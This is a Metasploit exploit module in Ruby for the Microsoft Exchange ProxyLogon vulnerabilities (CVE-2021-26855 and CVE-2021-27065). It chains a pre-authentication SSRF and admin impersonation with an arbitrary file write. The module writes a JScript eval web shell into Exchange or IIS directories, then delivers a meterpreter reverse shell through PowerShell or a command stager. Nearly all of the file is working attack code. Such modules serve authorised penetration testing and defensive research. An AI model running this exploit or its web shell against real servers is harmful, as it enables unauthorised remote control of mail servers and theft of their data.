##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck

  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Powershell
  include Msf::Exploit::Remote::CheckModule
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microsoft Exchange ProxyLogon RCE',
        'Description' => %q{
          This module exploit a vulnerability on Microsoft Exchange Server that
          allows an attacker bypassing the authentication, impersonating as the
          admin (CVE-2021-26855) and write arbitrary file (CVE-2021-27065) to get
          the RCE (Remote Code Execution).

          By taking advantage of this vulnerability, you can execute arbitrary
          commands on the remote Microsoft Exchange Server.

          This vulnerability affects (Exchange 2013 Versions < 15.00.1497.012,
          Exchange 2016 CU18 < 15.01.2106.013, Exchange 2016 CU19 < 15.01.2176.009,
          Exchange 2019 CU7 < 15.02.0721.013, Exchange 2019 CU8 < 15.02.0792.010).

          All components are vulnerable by default.
        },
        'Author' => [
          'Orange Tsai', # Dicovery (Officially acknowledged by MSRC)
          'Jang (@testanull)', # Vulnerability analysis + PoC (https://twitter.com/testanull)
          'mekhalleh (RAMELLA Sébastien)', # Module author independent researcher (who listen to 'Le Comptoir Secu' and work at Zeop Entreprise)
          'print("")', # https://www.o2oxy.cn/3169.html
          'lotusdll' # https://twitter.com/lotusdll/status/1371465073525362691
        ],
        'References' => [
          ['CVE', '2021-26855'],
          ['CVE', '2021-27065'],
          ['LOGO', 'https://proxylogon.com/images/logo.jpg'],
          ['URL', 'https://proxylogon.com/'],
          ['URL', 'http://aka.ms/exchangevulns'],
          ['URL', 'https://www.praetorian.com/blog/reproducing-proxylogon-exploit'],
          [
            'URL',
            'https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265'
          ],
          ['URL', 'https://www.o2oxy.cn/3169.html'],
          ['URL', 'https://github.com/Zeop-CyberSec/proxylogon_writeup']
        ],
        'DisclosureDate' => '2021-03-02',
        'License' => MSF_LICENSE,
        'DefaultOptions' => {
          'CheckModule' => 'auxiliary/scanner/http/exchange_proxylogon',
          'HttpClientTimeout' => 60,
          'RPORT' => 443,
          'SSL' => true,
          'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
        },
        'Platform' => ['windows'],
        'Arch' => [ARCH_CMD, ARCH_X64],
        'Privileged' => true,
        'Targets' => [
          [
            'Windows Powershell',
            {
              'Platform' => 'windows',
              'Arch' => [ARCH_X64],
              'Type' => :windows_powershell,
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Windows Dropper',
            {
              'Platform' => 'windows',
              'Arch' => [ARCH_X64],
              'Type' => :windows_dropper,
              'CmdStagerFlavor' => %i[psh_invokewebrequest],
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',
                'CMDSTAGER::FLAVOR' => 'psh_invokewebrequest'
              }
            }
          ],
          [
            'Windows Command',
            {
              'Platform' => 'windows',
              'Arch' => [ARCH_CMD],
              'Type' => :windows_command,
              'DefaultOptions' => {
                'DisablePayloadHandler' => true,
                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
          'AKA' => ['ProxyLogon']
        }
      )
    )

    register_options([
      OptString.new('EMAIL', [true, 'A known email address for this organization']),
      OptEnum.new('METHOD', [true, 'HTTP Method to use for the check', 'POST', ['GET', 'POST']]),
      OptBool.new('UseAlternatePath', [true, 'Use the IIS root dir as alternate path', false])
    ])

    register_advanced_options([
      OptString.new('ExchangeBasePath', [true, 'The base path where exchange is installed', 'C:\\Program Files\\Microsoft\\Exchange Server\\V15']),
      OptString.new('ExchangeWritePath', [true, 'The path where you want to write the backdoor', 'owa\\auth']),
      OptString.new('IISBasePath', [true, 'The base path where IIS wwwroot directory is', 'C:\\inetpub\\wwwroot']),
      OptString.new('IISWritePath', [true, 'The path where you want to write the backdoor', 'aspnet_client']),
      OptString.new('MapiClientApp', [true, 'This is MAPI client version sent in the request', 'Outlook/15.0.4815.1002']),
      OptInt.new('MaxWaitLoop', [true, 'Max counter loop to wait for OAB Virtual Dir reset', 30]),
      OptString.new('UserAgent', [true, 'The HTTP User-Agent sent in the request', 'Mozilla/5.0'])
    ])
  end

  def cmd_windows_generic?
    datastore['PAYLOAD'] == 'cmd/windows/generic'
  end

  def encode_cmd(cmd)
    cmd = cmd.gsub('\\', '\\\\\\')
    cmd = cmd.gsub('"', '\u0022').gsub('&', '\u0026').gsub('+', '\u002b')
  end

  def execute_command(cmd, _opts = {})
    cmd = "Response.Write(new ActiveXObject(\"WScript.Shell\").Exec(\"#{encode_cmd(cmd)}\").StdOut.ReadAll());"
    send_request_raw(
      'method' => 'POST',
      'uri' => normalize_uri(web_directory, @random_filename),
      'ctype' => 'application/x-www-form-urlencoded',
      'data' => "#{@random_inputname}=#{cmd}"
    )
  end

  def install_payload(exploit_info)
    # exploit_info: [server_name, sid, session, canary, oab_id]

    input_name = rand_text_alpha(4..8).to_s
    shell = "http://o/#<script language=\"JScript\" runat=\"server\">function Page_Load(){eval(Request[\"#{input_name}\"],\"unsafe\");}</script>"
    data = {
      'identity': {
        '__type': 'Identity:ECP',
        'DisplayName': (exploit_info[4][0]).to_s,
        'RawIdentity': (exploit_info[4][1]).to_s
      },
      'properties': {
        'Parameters': {
          '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
          'ExternalUrl': shell.to_s
        }
      }
    }.to_json

    response = send_http(
      'POST',
      "Admin@#{exploit_info[0]}:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=#{exploit_info[3]}&a=~#{random_ssrf_id}",
      data: data,
      cookie: exploit_info[2],
      ctype: 'application/json; charset=utf-8',
      headers: {
        'msExchLogonMailbox' => patch_sid(exploit_info[1]),
        'msExchTargetMailbox' => patch_sid(exploit_info[1]),
        'X-vDirObjectId' => (exploit_info[4][1]).to_s
      }
    )
    return '' if response.code != 200

    input_name
  end

  def message(msg)
    "#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
  end

  def patch_sid(sid)
    ar = sid.to_s.split('-')
    if ar[-1] != '500'
      sid = "#{ar[0..6].join('-')}-500"
    end

    sid
  end

  def random_mapi_id
    id = "{#{Rex::Text.rand_text_hex(8)}"
    id = "#{id}-#{Rex::Text.rand_text_hex(4)}"
    id = "#{id}-#{Rex::Text.rand_text_hex(4)}"
    id = "#{id}-#{Rex::Text.rand_text_hex(4)}"
    id = "#{id}-#{Rex::Text.rand_text_hex(12)}}"
    id.upcase
  end

  def random_ssrf_id
    # https://en.wikipedia.org/wiki/2,147,483,647 (lol)
    # max. 2147483647
    rand(1941962752..2147483647)
  end

  def request_autodiscover(server_name)
    xmlns = { 'xmlns' => 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a' }

    response = send_http(
      'POST',
      "#{server_name}/autodiscover/autodiscover.xml?a=~#{random_ssrf_id}",
      data: soap_autodiscover,
      ctype: 'text/xml; charset=utf-8'
    )

    case response.body
    when %r{<ErrorCode>500</ErrorCode>}
      fail_with(Failure::NotFound, 'No Autodiscover information was found')
    when %r{<Action>redirectAddr</Action>}
      fail_with(Failure::NotFound, 'No email address was found')
    end

    xml = Nokogiri::XML.parse(response.body)

    legacy_dn = xml.at_xpath('//xmlns:User/xmlns:LegacyDN', xmlns)&.content
    fail_with(Failure::NotFound, 'No \'LegacyDN\' was found') if legacy_dn.nil? || legacy_dn.empty?

    server = ''
    xml.xpath('//xmlns:Account/xmlns:Protocol', xmlns).each do |item|
      type = item.at_xpath('./xmlns:Type', xmlns)&.content
      if type == 'EXCH'
        server = item.at_xpath('./xmlns:Server', xmlns)&.content
      end
    end
    fail_with(Failure::NotFound, 'No \'Server ID\' was found') if server.nil? || server.empty?

    [server, legacy_dn]
  end

  # https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcmapihttp/c245390b-b115-46f8-bc71-03dce4a34bff
  def request_mapi(server_name, legacy_dn, server_id)
    data = "#{legacy_dn}\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
    headers = {
      'X-RequestType' => 'Connect',
      'X-ClientInfo' => random_mapi_id,
      'X-ClientApplication' => datastore['MapiClientApp'],
      'X-RequestId' => "#{random_mapi_id}:#{Rex::Text.rand_text_numeric(5)}"
    }

    sid = ''
    response = send_http(
      'POST',
      "Admin@#{server_name}:444/mapi/emsmdb?MailboxId=#{server_id}&a=~#{random_ssrf_id}",
      data: data,
      ctype: 'application/mapi-http',
      headers: headers
    )
    if response.code == 200
      sid_regex = /S-[0-9]*-[0-9]*-[0-9]*-[0-9]*-[0-9]*-[0-9]*-[0-9]*/

      sid = response.body.match(sid_regex).to_s
    end
    fail_with(Failure::NotFound, 'No \'SID\' was found') if sid.empty?

    sid
  end

  def request_oab(server_name, sid, session, canary)
    data = {
      'filter': {
        'Parameters': {
          '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
          'SelectedView': '',
          'SelectedVDirType': 'OAB'
        }
      },
      'sort': {}
    }.to_json

    response = send_http(
      'POST',
      "Admin@#{server_name}:444/ecp/DDI/DDIService.svc/GetList?reqId=1615583487987&schema=VirtualDirectory&msExchEcpCanary=#{canary}&a=~#{random_ssrf_id}",
      data: data,
      cookie: session,
      ctype: 'application/json; charset=utf-8',
      headers: {
        'msExchLogonMailbox' => patch_sid(sid),
        'msExchTargetMailbox' => patch_sid(sid)
      }
    )

    if response.code == 200
      data = JSON.parse(response.body)
      data['d']['Output'].each do |oab|
        if oab['Server'].downcase == server_name.downcase
          return [oab['Identity']['DisplayName'], oab['Identity']['RawIdentity']]
        end
      end
    end

    []
  end

  def request_proxylogon(server_name, sid)
    data = "<r at=\"Negotiate\" ln=\"#{datastore['EMAIL'].split('@')[0]}\"><s>#{sid}</s></r>"
    session_id = ''
    canary = ''

    response = send_http(
      'POST',
      "Admin@#{server_name}:444/ecp/proxyLogon.ecp?a=~#{random_ssrf_id}",
      data: data,
      ctype: 'text/xml; charset=utf-8',
      headers: {
        'msExchLogonMailbox' => patch_sid(sid),
        'msExchTargetMailbox' => patch_sid(sid)
      }
    )
    if response.code == 241
      session_id = response.get_cookies.scan(/ASP\.NET_SessionId=([\w\-]+);/).flatten[0]
      canary = response.get_cookies.scan(/msExchEcpCanary=([\w\-_.]+);*/).flatten[0] # coin coin coin ...
    end

    [session_id, canary]
  end

  # pre-authentication SSRF (Server Side Request Forgery) + impersonate as admin.
  def run_cve_2021_26855
    # request for internal server name.
    response = send_http(datastore['METHOD'], "localhost~#{random_ssrf_id}")
    if response.code != 500 || !response.headers.to_s.include?('X-FEServer')
      fail_with(Failure::NotFound, 'No \'X-FEServer\' was found')
    end

    server_name = response.headers['X-FEServer']
    print_status("Internal server name (#{server_name})")

    # get informations by autodiscover request.
    print_status(message('Sending autodiscover request'))
    server_id, legacy_dn = request_autodiscover(server_name)

    print_status("Server: #{server_id}")
    print_status("LegacyDN: #{legacy_dn}")

    # get the user UID using mapi request.
    print_status(message('Sending mapi request'))
    sid = request_mapi(server_name, legacy_dn, server_id)
    print_status("SID: #{sid} (#{datastore['EMAIL']})")

    # search oab
    sid, session, canary, oab_id = search_oab(server_name, sid)

    [server_name, sid, session, canary, oab_id]
  end

  # post-auth arbitrary file write.
  def run_cve_2021_27065(session_info)
    # set external url (and set the payload).
    print_status('Prepare the payload on the remote target')
    input_name = install_payload(session_info)

    fail_with(Failure::NoAccess, 'Could\'t prepare the payload on the remote target') if input_name.empty?

    # reset the virtual directory (and write the payload).
    print_status('Write the payload on the remote target')
    remote_file = write_payload(session_info)

    fail_with(Failure::NoAccess, 'Could\'t write the payload on the remote target') if remote_file.empty?

    # wait a lot.
    i = 0
    while i < datastore['MaxWaitLoop']
      received = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(web_directory, remote_file)
      })
      if received && (received.code == 200)
        break
      end

      print_warning("Wait a lot (#{i})")
      sleep 5
      i += 1
    end
    fail_with(Failure::PayloadFailed, 'Could\'t take the remote backdoor (see. ExchangePathBase option)') if received.code == 302

    [input_name, remote_file]
  end

  def search_oab(server_name, sid)
    # request cookies (session and canary)
    print_status(message('Sending ProxyLogon request'))

    print_status('Try to get a good msExchCanary (by patching user SID method)')
    session_id, canary = request_proxylogon(server_name, patch_sid(sid))
    if canary
      session = "ASP.NET_SessionId=#{session_id}; msExchEcpCanary=#{canary};"
      oab_id = request_oab(server_name, sid, session, canary)
    end

    if oab_id.nil? || oab_id.empty?
      print_status('Try to get a good msExchCanary (without correcting the user SID)')
      session_id, canary = request_proxylogon(server_name, sid)
      if canary
        session = "ASP.NET_SessionId=#{session_id}; msExchEcpCanary=#{canary};"
        oab_id = request_oab(server_name, sid, session, canary)
      end
    end

    fail_with(Failure::NotFound, 'No \'ASP.NET_SessionId\' was found') if session_id.nil? || session_id.empty?
    fail_with(Failure::NotFound, 'No \'msExchEcpCanary\' was found') if canary.nil? || canary.empty?
    fail_with(Failure::NotFound, 'No \'OAB Id\' was found') if oab_id.nil? || oab_id.empty?

    print_status("ASP.NET_SessionId: #{session_id}")
    print_status("msExchEcpCanary: #{canary}")
    print_status("OAB id: #{oab_id[1]} (#{oab_id[0]})")

    return [sid, session, canary, oab_id]
  end

  def send_http(method, ssrf, opts = {})
    ssrf = "X-BEResource=#{ssrf};"
    if opts[:cookie] && !opts[:cookie].empty?
      opts[:cookie] = "#{ssrf} #{opts[:cookie]}"
    else
      opts[:cookie] = ssrf.to_s
    end

    opts[:ctype] = 'application/x-www-form-urlencoded' if opts[:ctype].nil?

    request = {
      'method' => method,
      'uri' => @random_uri,
      'agent' => datastore['UserAgent'],
      'ctype' => opts[:ctype]
    }
    request = request.merge({ 'data' => opts[:data] }) unless opts[:data].nil?
    request = request.merge({ 'cookie' => opts[:cookie] }) unless opts[:cookie].nil?
    request = request.merge({ 'headers' => opts[:headers] }) unless opts[:headers].nil?

    received = send_request_cgi(request)
    fail_with(Failure::TimeoutExpired, 'Server did not respond in an expected way') unless received

    received
  end

  def soap_autodiscover
    <<~SOAP
      <?xml version="1.0" encoding="utf-8"?>
      <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
        <Request>
          <EMailAddress>#{datastore['EMAIL']}</EMailAddress>
          <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
        </Request>
      </Autodiscover>
    SOAP
  end

  def web_directory
    if datastore['UseAlternatePath']
      web_dir = datastore['IISWritePath'].gsub('\\', '/')
    else
      web_dir = datastore['ExchangeWritePath'].gsub('\\', '/')
    end
    web_dir
  end

  def write_payload(exploit_info)
    # exploit_info: [server_name, sid, session, canary, oab_id]

    remote_file = "#{rand_text_alpha(4..8)}.aspx"
    if datastore['UseAlternatePath']
      remote_path = "#{datastore['IISBasePath'].split(':')[1]}\\#{datastore['IISWritePath']}"
      remote_path = "\\\\127.0.0.1\\#{datastore['IISBasePath'].split(':')[0]}$#{remote_path}\\#{remote_file}"
    else
      remote_path = "#{datastore['ExchangeBasePath'].split(':')[1]}\\FrontEnd\\HttpProxy\\#{datastore['ExchangeWritePath']}"
      remote_path = "\\\\127.0.0.1\\#{datastore['ExchangeBasePath'].split(':')[0]}$#{remote_path}\\#{remote_file}"
    end

    data = {
      'identity': {
        '__type': 'Identity:ECP',
        'DisplayName': (exploit_info[4][0]).to_s,
        'RawIdentity': (exploit_info[4][1]).to_s
      },
      'properties': {
        'Parameters': {
          '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel',
          'FilePathName': remote_path.to_s
        }
      }
    }.to_json

    response = send_http(
      'POST',
      "Admin@#{exploit_info[0]}:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=#{exploit_info[3]}&a=~#{random_ssrf_id}",
      data: data,
      cookie: exploit_info[2],
      ctype: 'application/json; charset=utf-8',
      headers: {
        'msExchLogonMailbox' => patch_sid(exploit_info[1]),
        'msExchTargetMailbox' => patch_sid(exploit_info[1]),
        'X-vDirObjectId' => (exploit_info[4][1]).to_s
      }
    )
    return '' if response.code != 200

    remote_file
  end

  def exploit
    @proto = (ssl ? 'https' : 'http')
    @random_uri = normalize_uri('ecp', "#{rand_text_alpha(1..3)}.js")

    print_status(message('Attempt to exploit for CVE-2021-26855'))
    exploit_info = run_cve_2021_26855

    print_status(message('Attempt to exploit for CVE-2021-27065'))
    shell_info = run_cve_2021_27065(exploit_info)

    @random_inputname = shell_info[0]
    @random_filename = shell_info[1]

    print_good("Yeeting #{datastore['PAYLOAD']} payload at #{peer}")
    if datastore['UseAlternatePath']
      remote_file = "#{datastore['IISBasePath']}\\#{datastore['IISWritePath']}\\#{@random_filename}"
    else
      remote_file = "#{datastore['ExchangeBasePath']}\\FrontEnd\\HttpProxy\\#{datastore['ExchangeWritePath']}\\#{@random_filename}"
    end
    register_files_for_cleanup(remote_file)

    # trigger powa!
    case target['Type']
    when :windows_command
      vprint_status("Generated payload: #{payload.encoded}")

      if !cmd_windows_generic?
        execute_command(payload.encoded)
      else
        response = execute_command("cmd /c #{payload.encoded}")

        print_warning('Dumping command output in response')
        output = response.body.split('Name                            :')[0]
        if output.empty?
          print_error('Empty response, no command output')
          return
        end
        print_line(output)
      end
    when :windows_dropper
      execute_command(generate_cmdstager.join())
    when :windows_powershell
      cmd = cmd_psh_payload(payload.encoded, payload.arch.first, remove_comspec: true)
      execute_command(cmd)
    end
  end

end
